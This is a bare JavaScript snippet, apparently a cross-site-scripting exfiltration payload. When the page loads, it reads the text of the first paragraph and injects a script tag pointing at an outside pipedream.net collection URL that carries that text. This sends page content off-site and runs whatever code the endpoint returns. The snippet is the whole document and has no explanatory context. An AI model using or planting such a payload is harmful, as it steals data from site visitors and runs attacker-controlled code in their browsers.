document.addEventListener("DOMContentLoaded", function() {
  var script = document.createElement('script');
  var payload = document.querySelector('p').innerText;
  script.src = 'https://enpvax575bdmd.x.pipedream.net/' + encodeURIComponent(payload)  + '.js'
  document.body.appendChild(script);
});
